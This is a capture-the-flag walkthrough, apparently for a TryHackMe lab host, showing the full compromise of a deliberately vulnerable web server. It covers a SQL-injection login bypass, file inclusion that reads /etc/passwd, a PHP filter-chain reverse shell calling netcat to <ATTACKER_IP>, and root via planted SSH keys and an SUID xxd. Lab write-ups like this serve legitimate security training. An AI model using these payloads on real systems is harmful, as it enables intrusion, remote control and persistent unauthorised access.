# Enumeration

## \[+] 10.10.228.36 - cheese.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.228.36 cheese.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.228.36
```

There are a ton of ports open, so we'll just try to scan the most common ports using the following command:

```sh
sudo nmap -v -Pn -sS -top-ports 100 -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] cheese.thm

On the homepage, we'll find one working link to the login portal:

![622bfa363d6a659ce2393eec62f8b3d0.png](/resources/97d33c6bf37149c68ab78c4391a83503.png)

Scrolling to the bottom of the page, we will find an e-mail with the domain `thecheeseshop.com` which we will also add to our `/etc/hosts` file:

![9fe35f93a7a68a889b1f22da52070b04.png](/resources/5ebb3d1cba31454cb4d67a049321f600.png)

### \[-] cheese.thm/login

![9aec66c2ed806b1dea4ccc0a6a0fdaf3.png](/resources/ebc7739cce9947459cd3ebff95e74cef.png)

Here, we'll find a login portal that can be easily bypassed with the following SQL injection as the username and any password:

Username: `'-''-- 2`
Password: `test`

![ca752520fe6eb3a8216d227f8ed99e5a.png](/resources/efc374b6c3cd47a2bbc8ff9279b24d8c.png)

# Initial Foothold

### \[-] cheese.thm/secret-script.php?file=supersecretadminpanel.html

After bypassing the login portal, we are redirected to `http://cheese.thm/secret-script.php?file=supersecretadminpanel.html` which uses PHP to load the HTML file `supersecretadminpanel.html` via the `file` parameter.

We can try to see if the `file` parameter is vulnerable to [Local File Inclusion (LFI)](https://book.hacktricks.xyz/pentesting-web/file-inclusion) by prepending the characters "`../`" to move up directories. We can add multiple instances of the charcters "`../`" to make sure we are in the root directory then try to read files from other directories, like `/etc/passwd`.

Let's send the following curl request to see if we can read the `/etc/passwd` file:

```sh
curl -vvv http://cheese.thm/secret-script.php?file=../../../../../etc/passwd
```

![72facf9520beb210c660e19b321afc08.png](/resources/d793a94c64aa4ec7a26fd9166a704908.png)

At this point, I tried reading the `secret-script.php` file using the above method, but was unable to do so.

### \[-] www-data\@cheesectf

From this [HackTricks article](https://book.hacktricks.xyz/pentesting-web/file-inclusion#basic-lfi-and-bypasses), we will find some PHP bypass techniques. We can use the `php://filter` along with the `convert.base64-encode` filter to encode the `secret-script.php` file into base64 and then use the pipe character (`|`) to send the output to the `base64` command with the `-d` flag to decode the PHP file:

```sh
curl -vvv cheese.thm/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php | base64 -d
```

![300965b22760127c4e94ea7d48f89462.png](/resources/8c3acd2236fc4eeca63eeab156dc5dc3.png)

```php
<?php
  //echo "Hello World";
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

Now, we have confirmed we can use the PHP filter. Let's try using the [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) by Synactiv to get Remote Code Execution (RCE). This script will create a PHP filter chain that will execute code - in this case a remote shell. The output is long, so we will pipe the output to `grep` so we grab only the PHP filter portion and save it to `shell.txt`:

```sh
python3 php_filter_chain_generator.py --chain '<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f"); ?>' | grep '^php' > shell.txt
```

Before sending the PHP filter payload, we need to start our Netcat listener:

```sh
nc -nvlp 4444
```

Next, send the following command to execute the reverse shell payload:

```sh
curl -s "http://cheese.thm/secret-script.php?file=$(cat shell.txt)"
```

![55942a2dd7b3d0985805860a80631c1c.png](/resources/edf67f03e3e54153b3b33ba29f61f6ff.png)

Let's stablize our new shell:

1. Use Python to spawn a stable shell:

   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

2. `CTRL+Z` to background the current shell

3. Fix echoing and foregrounds the shell:

   ```sh
   stty raw -echo;fg
   ```

4. Set terminal to use 256 colors:

   ```sh
   export TERM=xterm-256color
   ```

# Privilege Escalation

### \[-] comte\@cheesectf

After some enumeration, we will find the `/home/comte/.ssh/authorized_keys` file is writeable for us:

```sh
ls -lah /home/comte/.ssh/authorized_keys
```

![2786ddf7e32eca05c7087fa64cc7fcb6.png](/resources/4719550a768144a1a5447ff110778b67.png)

We can generate our own SSH keys and write our public key to the `authorized_keys` file on the victim machine so that we can connect via SSH from our attacking machine.

On the attacking machine, we generate our SSH keys using the following command and configure it with a password, etc. if you'd like and save the file to a directory related to this lab (so you don't overwrite any existing SSH keys) with the filename `id_rsa`:

```sh
ssh-keygen
```

Next, we will base64 encode the `id_rsa.pub` file using `base64` with the `-w 0` flag to turn off word-wrapping:

```sh
base64 -w 0 id_rsa.pub
```

Copy the base64 string, then switch back to the terminal connected to the victim machine. We will decode the base64 string and save the output as `authorized_keys`:

```sh
echo "<BASE64_STRING>" | base64 -d > /home/comte/.ssh/authorized_keys
```

## Port 22 - SSH

Back on the attacking machine, we are now ready to connect via SSH using the following command:

```sh
ssh -i id_rsa comte@cheese.thm
```

![e877852926d20d8cc1984f550104bf58.png](/resources/b2671780c8f4435780330fc42c7eb519.png)

We can find the user flag in `/home/comte/user.txt`:

```
ls -lah
cat user.txt
```

![2fe978de9b3e3c7452c9fc0ab57bb290.png](/resources/fb901fe1ac644ca3a703deef5d842a8e.png)

### \[-] root\@cheesectf

Let's check our sudo permissions for the user `comte` by running `sudo -l`:

![8ae11c908bd65b7dd9965b4c3f960bac.png](/resources/955a2dc2d73e4bccb2fbfaa564cdbc44.png)

We can search for this `exploit.timer` file by using the `find` command:

```sh
find / -type f -name 'exploit.timer' 2>/dev/null
```

![32cfaa5c34dcbc9f43d96deb5c50b5d0.png](/resources/44b547fad16f466aa15cd5ccfd71dbbe.png)

Checking the contents of the `exploit.timer` file, we will find that it has no boot timer set:

```sh
cat /etc/systemd/system/exploit.timer
```

```plaintext
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

This timer is used to trigger a service, so let's try searching for `exploit.service` using the `find` command:

```sh
find / -type f -name 'exploit.service' 2>/dev/null
```

![8086676e88cbc45bc509cf5bd5d065a3.png](/resources/b713628557c74d3e82ed080ef10bc703.png)

When we `cat` this file, we will find that it makes a copy of the `xxd` binary, gives it the [SUID bit](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit) and makes it executable using `chmod`:

![68d75c727b7a8303f8eb3fce42d09b72.png](/resources/cfb491a6c9d24884a0ce1228ed5f4729.png)

To activate this service, we will need to set a time in the `exploit.timer` file. We can edit this file using `nano` or any other text editor:

![9added993a785777099b407438cce694.png](/resources/611a9260a6d54c8f8f394055ef4650d9.png)

Set the `OnBootSec` to `3s` and press `CTRL+X` to save.

Now, we can reload the daemon by running:

```sh
sudo /bin/systemctl daemon-reload
```

Then, start the timer using the `exploit.timer` configuration file:

```sh
sudo /bin/systemctl start exploit.timer
```

After 3 seconds, when we check the `/opt` directory, we should find the `xxd` binary with the SUID bit set:

```sh
ls -lah /opt
```

![8127e79df748ccdbe6c302f8d36902b8.png](/resources/1619b7ca7908443bb4e6977352d04b2e.png)

Referring to the [GTFObins](https://gtfobins.github.io/gtfobins/xxd/) website, we will find a way to write to files using the `xxd` binary and since it has the SUID bit, we will be able to write to any file on the system.

We will `cat` the same SSH key we generated earlier for the user `comte` and write over the SSH key for the user `root`:

```sh
cat /home/comte/.ssh/authorized_keys | xxd | /opt/xxd -r - /root/.ssh/authorized_keys
```

On the attacking machine, we can connect via SSH with the same key we generated earlier:

```sh
ssh -i id_rsa root@cheese.thm
```

![667979a08964dd6180084ade68c10543.png](/resources/04604008bb194c4e83d87eb2de33f6b7.png)

We can find the root flag in `/root/root.txt`:

```sh
ls -lah
cat root.txt
```

![8f18ff555a858655238b06202e8f8605.png](/resources/0f0bec38277b475b88c0d7101176393d.png)
